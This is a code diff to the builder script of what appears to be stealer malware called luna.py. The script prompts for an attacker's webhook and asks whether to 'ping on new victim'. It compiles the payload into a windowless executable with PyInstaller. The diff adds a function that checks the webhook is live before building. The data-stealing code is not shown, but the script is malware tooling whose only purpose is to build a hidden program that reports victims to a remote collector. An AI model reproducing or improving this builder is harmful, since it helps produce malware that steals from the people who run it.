@@ -1,8 +1,10 @@
 import os
+import requests
 import random
 import shutil
 import subprocess
 import time
+import sys
 from json import dump, load, loads
 from urllib.request import urlopen
 
@@ -17,6 +19,11 @@ class Builder:
             exit()
 
         self.webhook = input(f'{Fore.MAGENTA}[+]{Fore.RESET} Enter your webhook: ')
+        if not self.check_webhook(self.webhook): 
+                print(f"{Fore.MAGENTA}[+]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}")
+                str(input(f"{Fore.MAGENTA}[+]{Fore.RESET} Press anything to exit..."))
+                sys.exit()
+
         self.filename = input(f'{Fore.MAGENTA}[+]{Fore.RESET} Enter your filename: ')
         self.ping = input(f'{Fore.MAGENTA}[+]{Fore.RESET} Ping on new victim? (y/n): ')
 
@@ -109,6 +116,16 @@ class Builder:
             os.system('cls')
 
         print(Style.RESET_ALL)
+
+    def check_webhook(self, webhook):
+        try:
+            with requests.get(webhook) as r:
+                if r.status_code == 200:
+                    return True
+                else:
+                    return False
+        except:
+            return False
     
     def check(self):
         required_files = {'./luna.py',
@@ -152,7 +169,7 @@ class Builder:
         print(f'{Fore.MAGENTA}[+]{Fore.RESET} Compiling code...')
         
         os.system(f'python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\{filename}.py')
-        
+
         cleans_dir = {'./__pycache__', './build'}
         cleans_file = {f'./{filename}.spec'}
         
